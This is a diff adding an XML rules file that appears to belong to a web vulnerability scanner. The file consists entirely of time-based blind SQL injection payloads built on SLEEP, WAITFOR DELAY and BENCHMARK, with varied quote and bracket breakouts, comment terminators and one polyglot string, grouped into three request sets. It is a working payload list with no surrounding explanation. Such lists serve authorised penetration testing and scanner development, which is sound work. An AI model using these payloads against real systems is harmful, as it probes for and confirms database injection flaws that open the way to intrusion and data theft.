@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <requests>
+            1 or sleep(5) #
+            ' and sleep(5) #
+            " and sleep(5) #
+            1 and sleep(5) #
+            ) and sleep(5) #
+            ' AND SLEEP(5) AND 'bey'='bey
+            ) and sleep(5) and (1=1
+            ') and sleep(5) #
+            ')) and sleep(5) #
+            ") and sleep(5) #
+            ")) and sleep(5) #
+            ';SELECT SLEEP(5)#
+            ' AND (SELECT * FROM (SELECT(SLEEP(5)))CQwx)-- kLnl
+            ;WAITFOR DELAY '00:00:05';--
+            ';WAITFOR DELAY '00:00:05';--
+            ');WAITFOR DELAY '00:00:5';--
+            );WAITFOR DELAY '00:00:05';--
+            ";WAITFOR DELAY '00:00:05';-- 
+        </requests>
+    </couple>
+    <couple id="2">
+        <requests>
+             and sleep(5)-- t
+            ) and sleep(5)-- t
+            " and sleep(5)-- t
+            ') and sleep(5)-- t
+            ')) and sleep(5)-- t
+            ' and sleep(5)-- t
+            1 or sleep(5)-- t
+            ") and sleep(5)-- t
+            ")) and sleep(5)-- t
+        </requests>
+    </couple>
+    <couple id="3">
+        <requests>
+            %20AND 9436=BENCHMARK(5,MD5(0x7852554f))-- t
+            %20OR SLEEP(5)-- t
+            ' AND 9436=BENCHMARK(5,MD5(0x7852554f))-- t
+            ' OR SLEEP(5)-- t
+            ') AND 9436=BENCHMARK(5,MD5(0x7852554f))-- t
+            ') OR SLEEP(5)-- t
+            ") AND 9436=BENCHMARK(5,MD5(0x7852554f))-- t
+            ") OR SLEEP(5)-- t
+            " AND 9436=BENCHMARK(5,MD5(0x7852554f)) #
+            " OR SLEEP(5) #
+            %20AND 9436=BENCHMARK(5,MD5(0x7852554f)) #
+            %20OR SLEEP(5) #
+            ' AND 9436=BENCHMARK(5,MD5(0x7852554f)) #
+            ' OR SLEEP(5) #
+            ') AND 9436=BENCHMARK(5,MD5(0x7852554f)) #
+            ') OR SLEEP(5) #
+            ") AND 9436=BENCHMARK(5,MD5(0x7852554f)) #
+            ") OR SLEEP(5) #
+            " AND 9436=BENCHMARK(5,MD5(0x7852554f)) #
+            " OR SLEEP(5) #
+            (select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/
+        </requests>
+    </couple>
+</rules>
